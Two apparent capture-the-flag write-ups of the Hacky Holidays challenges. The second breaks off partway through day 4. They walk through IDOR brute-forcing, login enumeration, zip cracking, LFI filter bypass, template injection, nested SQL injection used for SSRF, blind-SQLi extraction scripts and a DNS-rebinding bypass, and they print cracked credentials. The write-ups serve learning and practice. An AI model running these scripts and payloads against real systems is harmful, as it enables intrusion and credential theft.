Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

Preface
Like any other good stories, this adventure has also begun with a few (long) days of preparation leading up to the start of the challenge. Tools were sharpened, command lines were dusted-off and one-too-many cups of coffee were consumed. The morale was high and the designated day finally arrived.
Was any of that believable? If things go south I might as well just start writing novels..dope 🧐
What really happened was, I started this CTF three days late. I knew about it, but a little bit of procrastination (quite a lot tbh) mixed with a couple of other factors made it so I wasn't going to partake in it. Until one day (on December 15th to be precise) I opened Slack and I saw a message from @cranelab.
<image_0>
At this point, after briefly talking to him, I was like "fuck it screw it let's do this".
And it began. The build-up to it was a little less epic than what I made it sound in the first place but don't worry, it's gonna be a reoccurring theme in this story. Buckle up, grab some popcorns because this is the story of 12 long days (actually it's more than 12 but it sounds cooler if I say that) filled with successes, failures, pain, happiness, tears, *insert more emotions* and a bad green guy.
Flag1 - Robots.txt
I mean, the title pretty much gives it away. We're presented with a single webpage with a message explicitly stating we're not wanted here (I thought of leaving but yeah there wouldn't be a story so I didn't).
As a good rule of thumb, when there isn't any other clear input on the page, content discovery is always a safe option. I checked the page source code, nothing was there, so I proceeded to see if the /robots.txt endpoint was available. Yes sir, first flag down and we now have a new endpoint for what seems to be the second flag.
flag{48104912-28b0-494a-9995-a203d1e261e7}
Flag2 - DOM Flag
Following the clue from flag1 let's visit /s3cr3t-ar3a just to be greeted by a "Page Moved" message.
<image_1>
I've tried a couple of options to actually get this flag, purely based on what made sense to me. From "common" hacker endpoints (/1337, 1337-encoded endpoints, etc...) to random changes to the current endpoint, but none of those worked. As a reminder from flag1, always check the page source of whatever you're looking at. This time around though, don't forget that everything that javascript changes/adds/updates before the page is fully loaded will not be present in the page source(Ctrl+U). By inspecting(Ctrl+Shift+I) the fully rendered page and quickly Ctrl+f-ing for flag we can clearly (not from the picture below) see our 2nd flag.
<image_2>
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
Flag3 - People Rater
Day3 - so far so good. It's a smooth ride in what is supposed to be the grinch's lair (yeah right 🤣). Something in the air makes me think it won't be this easy moving forward though. Only time will tell (I actually already know it won't be this easy cause I'm writing this after completing the CTF but yeah you get the point).
I can now see a bunch of blue buttons. By studying the behavior of the page we can see alerts popping up every time we click one of them and we also have the possibility to load more blue inputs. Let's analyze the GET request that happens every time we click one of these famous buttons.
Code 96 Bytes
1GET /people-rater/entry?id=eyJpZCI6NH0= HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
mmm...It looks like the base64 encoded id parameter is responsible for identifying a JSON object on the backend as we can observe from the response
Code 62 Bytes
1{"id":"eyJpZCI6NH0=","name":"Ruth Ward","rating":"Disgusting"}
The parameter itself decodes to {"id":4} and at this point is now pretty clear to me that we're facing an IDOR. The way we approach it can be different but I'll guide you through what I decided to do.
The rain was pouring outside, my thoughts were pretty much syncing with the slow falling of the raindrops on the concrete balcony (idk what this means it just sounds like something you'd read in a book ). I decided to get the easy way out. Bruteforce it is. I prepared a quick script for turbo-intruder that copies the behavior we just analyzed, cycle through a range of numbers and look for a flag in the responses
Code 583 Bytes
1import base64
2def queueRequests(target, wordlists):
3    engine = RequestEngine(endpoint=target.endpoint,
4                           concurrentConnections=5,
5                           requestsPerConnection=100,
6                           pipeline=False
7                           )
8
9    for i in range(0, 256):
10        engine.queue(target.req, base64.urlsafe_b64encode("{\"id\":" + bytes(i) + "}"))
11
12
13def handleResponse(req, interesting):
14    # currently available attributes are req.status, req.wordcount, req.length and req.response
15    if req.status != 404:
16        table.add(req)
One response has notably more words, flag3 has now been secured!
Code 163 Bytes
1payload: {"id":1}
2response: {"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
Flag4 -Swag Shop
It's shopping time. I don't know why I should be supporting enemies' businesses but here I am. Here's the shop page.
<image_3>
I won't lie I was feeling bougie and that 400$ snowball launcher didn't sound too bad. But unfortunately, we're not here for pleasure. After trying out the page functionalities we can see that in order to buy one of the objects we need login credentials.
One thing that I like to do when I see a login form is quickly testing the POST /login request for a low-hanging SQLi vulnerability and luckily this was not the case. Both heuristic tests (spraying the inputs with characters such as ' and -- to see if something breaks or acts funny) and the sqlmap output confirmed it.
After analyzing the HTTP history for our target page we see that the backend is using an API base endpoint to execute significant operations (e.g. /api/login and /api/purchase). What could this mean? I didn't have an answer right away because I proceeded to procrastinate for a few hours like a good mature and disciplined adventurer would do.
As soon as I got back on the page I thought of the advice I gave at the beginning of this story and proceeded to run a quick content-discovery with common API endpoints wordlist
Code 1.04 KiB
1~$ ffuf -w ~/tools/wordlists/seclists/Discovery/Web-Content/api/objects.txt -u "https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ" -mc 200
2
3        /'___\  /'___\           /'___\       
4       /\ \__/ /\ \__/  __  __  /\ \__/       
5       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
6        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
7         \ \_\   \ \_\  \ \____/  \ \_\       
8          \/_/    \/_/   \/___/    \/_/       
9
10       v1.2.0-git
11________________________________________________
12
13 :: Method           : GET
14 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ
15 :: Wordlist         : FUZZ: /home/thezoomer/tools/wordlists/seclists/Discovery/Web-Content/api/objects.txt
16 :: Follow redirects : false
17 :: Calibration      : false
18 :: Timeout          : 10
19 :: Threads          : 40
20 :: Matcher          : Response status: 200
21________________________________________________
22
23sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
24:: Progress: [3132/3132] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
Bingo! At /api/sessions we now can access a JSON object full of what it looks like encoded sessions data. At first glance, one entry looks different because of the double == at the end of the string. The base64 decoded string looks like this:
Code 231 Bytes
1"{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}"
Interestingly enough, we now have what it looks like a user identifier plus an encoded cookie that I don't really know what to do with. I've tried setting the cookie as a session cookie in my browser(both encoded and non) but the login form was not bypassed.
In hindsight, It's actually weird that the /api/user endpoint wasn't found from my content discovery process. Anyway, it took me just a little bit longer to figure out the possibility to hit said endpoint to get user info. What actually took me way longer than I'd like to admit is getting the right parameter name for the request. This is probably a lesson on why wordlists are widely used or maybe on paying attention to the data you're provided with. Either way, the user value we discovered previously was a clear example of a UUID. We can now craft the following request:
Code 120 Bytes
1GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
To my surprise, the flag is actually in the response and there's no need to bypass any login or other forms of access control.
Code 216 Bytes
1{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
Flag5 - Secure Login
My wishes were fulfilled and flag5 is actually all about bypassing a login form😂. No other significant endpoints or interesting behaviors were discovered in the recon process.
After, of course, ruling out SQLi as a possible vulnerability, I moved on to trying a good old login form spray. The hint to get this idea is right in front of us. The error message clearly says "Invalid Username". From a previous CTF(actually, it might have been one of Hacker101 challenges) I remembered that this is a clear sign of subsequent DB queries. If(and only if) the provided username exists, then a query to check for the password validity is made. This allows an attacker to get both credentials by checking the error message for every request.
The ffuf command looks like this
Code 247 Bytes
1ffuf -w ~/tools/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -u https://hackyholidays.h1ctf.com/secure-login -mr "Invalid Username"
and once we get the valid username access we can repeat the process to get the password computer.
The challenge is not over as we're presented with the following page.
<image_4>
We get the hint that something needs to be downloaded. Content discovery can't help us this time. Observing the admin cookie that was set after logging in I could see a base64 string that decoded to {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}. I tried the obvious solution consisting of changing the admin parameter to true, encoding the newly obtained string, and ultimately setting the NEW cookie.
This actually worked(😮) and a .zip file was now available to download: /my_secure_files_not_for_you.zip. One final step was required since the archive was protected with a password. Searching the web for common tools used in CTFs I came across fcrackzip and it worked perfectly.
Code 86 Bytes
1fcrackzip -v -u -D -p rockyou.txt /my_secure_files_not_for_you.zip
2
3password: hahahaha
Flag5 was successfully retrieved from the flag.txt file inside the archive. (Nice password choice)
Side note, the archive also had a rather NSFW picture of Mr. Grinch that almost got me fired from my workplace but I'll leave that story for another day.
<image_5>
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Flag6 - My Diary
Day 6. Morale is still relatively high. The sun is shining, I'm feeling good. 🌞
The page for flag6 /my-diary/?template=entries.html looks like a normal calendar with some questionable reminders.
After throwing around ideas with my fellow friend crane, it looked like content discovery was once again the first step to solve this.
This is the source code I could retrieve by spraying the template parameter to get an LFI-type scenario.
Valid /my-diary/?template=index.php endpoint:
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
Luckily enough my source code review skills didn't let me down and after setting up a quick testing environment I tried to bypass the weak regex filtering in order to access the admin.php page. After many and many tries I came up with the following payload:
/my-diary/?template=secretsecretadmin.phpadmin.phpadminadmin.php.phpadminadmin.php.php
I was able to exploit the fact the two regex filters occurred one after the other. It's quite complicated to put it into words but after writing it down it actually makes more sense. Oh well, onto the next one 🥶
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
Flag7 - Hate Mail Generator
<image_6>
The part that captured my interest was the already existing campaign. After clicking on it we can see how emails are generated
<image_7>
This is screaming SSTI but we still don't know what we are actually supposed to include.
This time, I'll try not to dance around it. Yep, you guessed it. It's content discovery again.
<image_8>
With this new info, we can make use of the /hate-mail-generator/new page and create our own malicious email.
We can't actually create a campaign "because we're out of credits" (who uses credits at all on a website in 2020 anyway) but /hate-mail-generator/new/preview will work just fine since it renders our manually injected payload.
Let's analyze the candidate request:
Code 228 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Type: application/x-www-form-urlencoded
5
6preview_markup=Hello+{{name}}&preview_data={"name":"Alice","email":"alice@test.com"}
We know the templates are added to our email by using the prefix {{template:XXXX}}. Directly injecting the payload in the preview_markupparameter doesn't work so I used the only other possible parameter (I had tested beforehand the possibility to add any custom values and properties to the preview_data parameter). This is what it looks like:
Code 121 Bytes
1preview_markup=Hello+{{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
As expected the name placeholder is translated to {{template:38dhs_admins_only_header.html}} by the template engine and then it's recursively replaced by the actual admin-only header since access control was only enforced on the first "template substitution" cycle.
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Flag8 -Forum
Day 8 update. I'm chilling but it's not an "I'm chilling" as powerful as a Day 1 "I'm chilling", you know what I mean? (probably not)
What a lovely forum we can see at /forum:
<image_9>
There's a login functionality again and the actual posts and comments are uniquely identified by a number as we can see from /forum/1/1. I did try to bruteforce some hidden posts/comments with no luck.
It's discovery time all-over again! The green guy seems to love it damn.
After finding the following valid endpoint https://hackyholidays.h1ctf.com/forum/phpmyadmin we have to get valid credentials to access the DB manager interface.
This next step doesn't really have a logical connection to the rest and I know some people didn't love it. I wasn't really bothered by it to be completely honest. It keeps things spicy at least no? Maybe I'm just getting numb to emotions. Yeah, that's probably it. 😶
At the end of the day, it doesn't really matter. I noticed a super old version of Jquery on the page but couldn't do anything with it. That's when someone (it may be cranelab again - don't quote me on this one) dropped a hint of having the source code stored somewhere.
https://github.com/Grinch-Networks/
When GitHub is involved, a wise old man once told me to always check past commits. Humans are humans(is that how the saying goes?) and they make mistakes. Well, he wasn't wrong:
<image_10>
We can now access the database and we get the hashed password for the grinch user.
By inspecting the source code a little bit deeper we know it's an MD5-hashed password
Code 290 Bytes
1public static function getByLogin($username, $password){
2        $d = Db::read()->prepare('select * from user where username = ? and password = ? LIMIT 1 ');
3        $d->execute( array($username,md5($password)));
4        return ( $d->rowCount() == 1 ) ? new User($d->fetch()) : false;
5    }
Before proceeding to use hashcat to try and crack the hash I've tried to use online tools just to be sure. https://hashes.com/en/decrypt/hash was actually able to crack it and we now have all we need to login into our forum.
credentials-> grinch:BahHumbug
A new post is now visible and the flag is right in there.
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
Flag10 - Signup Manager
You're probably wondering what happened to flag9. I don't really wanna talk about it. I now feel drained and don't even have jokes left in my inventory. Sad😢 (1 like 1 prayer thank you). Keep reading to know the truth.
This challenge was all about looking around and testing the functionalities already on the page. It's a normal login+signup form. Let's just dive into it.
<image_11>
Once logged in as a random user we are presented with a useless page with useless info (you can probably see my pent-up anger in my typing).
A (not)old friend came to the rescue once again. Content discovery gave us a README.md file with some juicy pieces of information stored inside.
From this line 2) Move signupmanager.zip into the new directory and unzip it. we now know of the existence of /signup-manager/signupmanager.zip. And we're back to reviewing source code. Honestly, I enjoyed it more than I expected so I'm not complaining.
Having access to the FULL signup process and having the knowledge on how to create an admin user (6) You can make anyone an admin by changing the last character in the users.txt file to a Y from the README.md file) is now down to find a valid exploit after thoroughly understanding what's happening to the user data on the backend. This section especially allowed to me understand what my goal was:
Code 1017 Bytes
1if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
2            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
3            if (strlen($username) < 3) {
4                $errors[] = 'Username must by at least 3 characters';
5            } else {
6                if (isset($all_users[$username])) {
7                    $errors[] = 'Username already exists';
8                }
9            }
10            $password = md5($_POST["password"]);
11            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
12            if (strlen($firstname) < 3) {
13                $errors[] = 'First name must by at least 3 characters';
14            }
15            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
16            if (strlen($lastname) < 3) {
17                $errors[] = 'Last name must by at least 3 characters';
18            }
19[...]
The best way to explain it is, imagine a container where you can store objects. No matter how big they are or how many you got, at the end of the process the amount of material inside the container will always be the same (weird analogy - I don't know what container would be able to do what I just explained). I had to find something that looked small but after being processed by this magical container, it had to expand in some way. And then it hit me. Math is a complex science. There are many ways to represent numbers and one of them fits our scenario perfectly .
By setting the age of the user to 1e5 and a last name FULL of letters Y I had successfully created an admin user.
Code 90 Bytes
1action=signup&username=jam&password=jam&age=1e7&firstname=jamjam&lastname=jamYYYYYYYYYYYYY
This happens because the string 1e5 matches all the criteria in place (it is indeed numeric and shorter than 4 digits). Once the server tries to write the number on the user.txt file though, it translates to its actual numeric value (100000). When all users are retrieved on the main page, only the first 113 characters for each one are used. The last character of our newly created user-string turns out to be a Y and admin privileges are granted. GGs! Flag acquired and we also get a link to access the next challenge.
flag{99309f0f-1752-44a5-af1e-a03e4150757d}
Flag11 - Recon Server
Let me preface this by saying: this is by far the hardest challenge on this CTF. It drained me of anything that I had left, from hope to sleep to enjoyment to humor (nah I'm lying I'm still gonna crack some jokes here and there). Kudos to Adam for making this but at the same time, I don't really like you after this.😉
Let's visit the page we discovered from finishing the previous challenge.
<image_12>
After hopping around for a bit, sqlmap actually found an SQLi entry point in the hash parameter at https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k. After dumping the DB I was left with nothing but insignificant crumbles.
I knew there was an API system in place by visiting the /api/ endpoint but it looked like it could be accessed only within the internal network.
The hint dropped by Adam was a reference to the Inception movie (I'll come clean and say I've never watched the movie even though I knew the general plot. I'm sorry movies fanatics, I'll make up to you one day).
<image_13>
This is where I started talking to osama.alaa (big shoutout to him) and after bouncing ideas off each other for a while we came to the conclusion of SQLi inside an SQLi, hence the movie reference What is this sorcery? Uncharted territory, to say the least. I'll fast forward the next part because it's pretty boring but it took MANY hours to finally get a working query
Code 109 Bytes
1hash=' UNION SELECT "' UNION SELECT 'null.jpg',null,'../api/user?username=test&password=test'-- -",null,1-- -
This results in a broken image, but once we open it in a new tab and hit /r3c0n_server_4fdk59/picture?data= the payload decodes to {"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/user?username=test&password=test","auth":"e645ca4b7a504c524e2cc1fb44fe02cc"}
This how we were able to achieve an SSRF to hit the /api endpoints. I just needed an SQLi inside another SQLi inside another SQLi inside another S....😓
The next steps consist of discovering what endpoint we could hit and the right parameters to use. Once that was out of the way, it was time to enumerate a valid user by sending requests to the /api/user endpoint. The tricky part and I have to shoutout @mcipekci for pointing me in the right direction, was using the % character in an SQL LIKE statement. This allows recursive queries to be made to enumerate our user.
This is the resulting script:
Code 1.58 KiB
1import requests
2import re
3from string import printable
4
5base_username=''
6base_password=''
7
8def search_username(username):
9    for c in printable:
10        if c == '_' or c == '%':
11            c = "\\" + c
12        r=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=\' UNION SELECT "\' UNION SELECT \'null.jpg\',null,\'../api/user?username={}{}%\'-- -",null,1-- -'.format(username,c))
13        regex=re.search('data=.*\"', r.text)
14        data_param=regex.group(0)
15        data_param = data_param[:-1]
16        r2=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?{}'.format(data_param))
17        
18        if r2.text.find("Invalid content type detected") != -1:
19            username += c
20            print("new char found: " +username)
21            search_username(username)
22
23def search_password(password):
24    for c in printable:
25        if c == '_' or c == '%':
26            c = "\\" + c
27        r=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=\' UNION SELECT "\' UNION SELECT \'null.jpg\',null,\'../api/user?password={}{}%\'-- -",null,1-- -'.format(password,c))
28        regex=re.search('data=.*\"', r.text)
29        data_param=regex.group(0)
30        data_param = data_param[:-1]
31        r2=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?{}'.format(data_param))
32        
33        if r2.text.find("Invalid content type detected") != -1:
34            password += c
35            print("new char found: " +password)
36            search_password(password)
37
38#search_username(base_username)
39search_password(base_password)
The credentials returned are grinchadmin:s4nt4sucks
We can now login into the attack-box, get the flag number 11 and move on to the 12th and last(ish) challenge.
flag{07a03135-9778-4dee-a83c-7ec330728e72}
Flag12 - Attack Box
My body and my spirit were put under unimaginable pressure after flag11. Nothing could faze me any longer. I think this what it feels like to reach nirvana. A completely different and better perspective on life was provided to me, so without further ado, let's bring this adventure to an end.
<image_14>
The Grinch is planning to take down Santa's servers and our goal is to plan a counterattack by taking him down instead. Honestly, it was like a walk in the park (it actually wasn't but it fits the narrative so Imma just run with it). Between a chess match with Buddah and a poker session with a couple of greek gods (I told you I was on a whole different level at this point no?) I was able to inspect the HTTP request responsible for starting a DDoS attack.
Code 231 Bytes
1GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687
It was time to crack the hash to get a hold of the situation. As confirmed by H1 it was indeed a salted hash. I came to the (pretty obvious) conclusion that the target IP was the variable and I tried to crack the salt using hashcat
<image_15>
Success! We now know the hash is a salted md5($pass.$salt) → [ip].mrgrinch463.
We can now craft whatever payload we want, thus being able to choose the target IP to attack. I quickly tried to use localhost in all its shapes and forms but there was an SSRF protection to bypass.
After trying every possible encoding (hex,octa,binary you name it) I stumbled across a common technique known as DNS rebind and an amazing tool rbndr.
In hindsight, the hint was always there. The fake command-line messages appeared in succession and a better eye would have spotted the vulnerability right away. We basically exploit the fact that the remote host lookup and then the actual attack occur in two separate time frames. This is ideal for TOCTOU attacks.
I finally got a working payload that looks like this:
Code 81 Bytes
1{"target":"cb007121.7f000001.rbndr.us","hash":"aa9c061c933f709acb4d69329bc7b1af"}
The host lookup is not gonna fail since that domain instantly resolved to a valid public IP (I used one of Santa's, hope he doesn't mind) but a short TTL allows it to resolve to 127.0.0.1 shortly after.
The grinch is defeated as the page we're redirected to show us.
<image_16>
I can now go back to finishing my discussion with Gandhi and Muhammad Ali, I left them hanging. Peace✌️
flag{07a03135-9778-4dee-a83c-7ec330728e72}
Flag9 - Evil Quiz
I hate giving this challenge attention but here we go. I say that because for the longest time I thought it was a time-based blind SQLi using the name param. So yeah I'm pissed at myself for being slow and wasting a lot of time on it (the server was slow too at times so can we have a 50/50?). Having solved flag11 before flag9 allowed me to pretty much speedrun through this one though. The idea here is very similar and all I had to do was change the script from flag11 and craft a new payload for what I now know is a BOOLEAN-BASED BLIND SQLi. Here it is:
Code 1.55 KiB
1import requests
2import re
3from string import printable
4
5base_username=''
6base_password='s3cret\_p4ssw0rd-'
7
8headers= { "Content-Type" : "application/x-www-form-urlencoded" }
9cookies= { "session" : "fa3c1dba251b1de924de64d2322c446f" }
10
11def search_username(username):    
12    for c in printable:
13        if c == '_' or c == '%':
14            c = "\\" + c
15        post_data = { "name" : "admin' and EXISTS (SELECT * FROM admin WHERE username LIKE '{}{}%') -- -".format(username,c) } 
16        r=requests.post('https://hackyholidays.h1ctf.com/evil-quiz', data = post_data, headers=headers, cookies=cookies)
17        r2=requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', cookies=cookies)
18        if r2.text.find("is 0 other player(s)") == -1:
19            username += c
20            print("new char found: " +username)
21            search_username(username)
22
23def search_password(password):
24    for c in printable:
25        if c == '_' or c == '%':
26            c = "\\" + c
27        post_data = { "name" : "admin' and EXISTS (SELECT * FROM admin WHERE username LIKE 'admin' and password LIKE '{}{}%') -- -".format(password,c) } 
28        r=requests.post('https://hackyholidays.h1ctf.com/evil-quiz', data = post_data, headers=headers, cookies=cookies)
29        r2=requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', cookies=cookies)
30        if r2.text.find("is 0 other player(s)") == -1:
31            password += c
32            print("new char found: " +password)
33            search_password(password)
34        
35        
36
37search_username(base_username)
38search_password(base_password)
Credentials: admin:S3creT_p4ssw0rd-$
Flag is secured! Quick side note: I learned that using LIKE BINARY 'strin%' statements allows you to have a case sensitive query (crucial for this challenge)
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Prologue
What can I say, what I thought was going to be another normal CTF event turned out to be much much more.
The Grinch is out and I evolved. It's a win-win in my books
Every story has an end and this is it. Here's a closing selfie I took right before writing this report/story/novel. Hope you enjoy it (I'm the one in the middle if it wasn't clear)
Legal disclaimer: my lawyer wanted me to say this.
No drugs or any other illegal substances were used in the process of writing this report (or in any other moment per say)
<image_17>
On a serious note though,
I had a blast and thanks to Adam, @nahamsec, and everyone else involved for making this. Shoutout also to my partner in crime @cranelab.
Hope you all had a good laugh reading this and I wish you all the best.
I'm out,
@thezoomer
Impact
Depending on what side you're on, impact may vary. Use with caution.



==================================================

Report File: 1069396.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Access Control - Generic

Contents:

Hello Team
Description
In the continuous series of 12 days, twelve flags were hidden inside Hackyholidays site - hackyholidays.h1ctf.com in which once we get all the flags, grinch can be stopped. This write-up will describe solving all the 12 days challenges.
Step To Reproduce
It all started when hackerone announced the hackyholidays CTF.
<image_0>
So, every day there will be one CTF added for the next 12 days so that it can end right before Christmas and we have to stop grinch by ruining his plans by getting all the flags and it'll save the holidays.
Day 1 - CTF level 1
On the first day, CTF level 1 launched. While I was looking into the site, there were no additional functionalities added and no paths, so the first thing which came to my mind before path brute-force and other methods is to always look on /robots.txt file where it can reveal some information.
When I opened https://hackyholidays.h1ctf.com/robots.txt, and thus, in the response, I got the first flag.
<image_1>
Flag 1 - flag{48104912-28b0-494a-9995-a203d1e261e7}
Day 2 - CTF level 2
In the first day, I've already discovered the path from https://hackyholidays.h1ctf.com/robots.txt.
Code 36 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
So, the path /s3cr3t-ar3a became the second-day challenge, and I visited the page https://hackyholidays.h1ctf.com/s3cr3t-ar3a,
<image_2>
There was a message on the page which says - page moved. I thought the first thing to look for any hidden paths is to check the page using the Inspect element. While doing the inspect element, I got the second flag. The flag was hidden inside the HTML element.
<image_3>
Code 131 Bytes
1<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
Flag 2 - flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
Day 3 - CTF level 3
On the 3rd day, One link has been added and it was https://hackyholidays.h1ctf.com/people-rater inside the /apps path.
<image_4>
So, when I visited the page, there was a people-rater application:
<image_5>
As per the logic explained before the start of this challenge - The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!
So, the hint was hidden in the challenge description which means there is a record or id parameter which needs to be used over here.
Intercepting the request on the "load more" was just loading the page using https://hackyholidays.h1ctf.com/people-rater/page/<number> where it was 1,2,3 and 4:
Request
Code 496 Bytes
1GET /people-rater/page/1 HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Accept: application/json, text/javascript, */*; q=0.01
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
6X-Requested-With: XMLHttpRequest
7Sec-Fetch-Site: same-origin
8Sec-Fetch-Mode: cors
9Sec-Fetch-Dest: empty
10Referer: https://hackyholidays.h1ctf.com/people-rater
11Accept-Encoding: gzip, deflate
12Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Response
Code 233 Bytes
1{"results":[{"id":"eyJpZCI6Mn0=","name":"Tea Avery"},{"id":"eyJpZCI6M30=","name":"Mihai Matthews"},{"id":"eyJpZCI6NH0=","name":"Ruth Ward"},{"id":"eyJpZCI6NX0=","name":"Calvin Hogan"},{"id":"eyJpZCI6Nn0=","name":"Reilly Cervantes"}]}
Looking at the response, the id parameter was base64 encrypted.
In the application, I click on the first record "Tea Avery" for rating and intercepted the request:
Request
Code 511 Bytes
1GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Accept: application/json, text/javascript, */*; q=0.01
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
6X-Requested-With: XMLHttpRequest
7Sec-Fetch-Site: same-origin
8Sec-Fetch-Mode: cors
9Sec-Fetch-Dest: empty
10Referer: https://hackyholidays.h1ctf.com/people-rater
11Accept-Encoding: gzip, deflate
12Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Response
Code 57 Bytes
1{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
When I decoded the base 64 id parameter, then the record was starting with the value as 2. eyJpZCI6Mn0= -base64decode - {"id":2}. This came to my attention, the rating was starting with id value 2 and so, let's try with value 1 and check what is the record hidden inside the parameter.
Encoded the base64 parameter - {"id":1} - eyJpZCI6MX0= and again send it to the server on the above request via changing the id parameter above and thus, we got the flag.
Request
Code 511 Bytes
1GET /people-rater/entry?id=eyJpZCI6MX0= HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Accept: application/json, text/javascript, */*; q=0.01
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
6X-Requested-With: XMLHttpRequest
7Sec-Fetch-Site: same-origin
8Sec-Fetch-Mode: cors
9Sec-Fetch-Dest: empty
10Referer: https://hackyholidays.h1ctf.com/people-rater
11Accept-Encoding: gzip, deflate
12Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Response
Code 135 Bytes
1{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
Flag 3 - flag{b705fb11-fb55-442f-847f-0931be82ed9a}
Day 4 - CTF level 4
On day 4, inside /apps, there was a new CTF level added as a swag-shop.
There was an option to purchase an Item over there and if we click on the link, it'll tell us to log in and it triggers an API request which returns a 401 response.
<image_6>
Request
Code 581 Bytes
1POST /swag-shop/api/purchase HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 4
5Accept: */*
6X-Requested-With: XMLHttpRequest
7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
8Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9Origin: https://hackyholidays.h1ctf.com
10Sec-Fetch-Site: same-origin
11Sec-Fetch-Mode: cors
12Sec-Fetch-Dest: empty
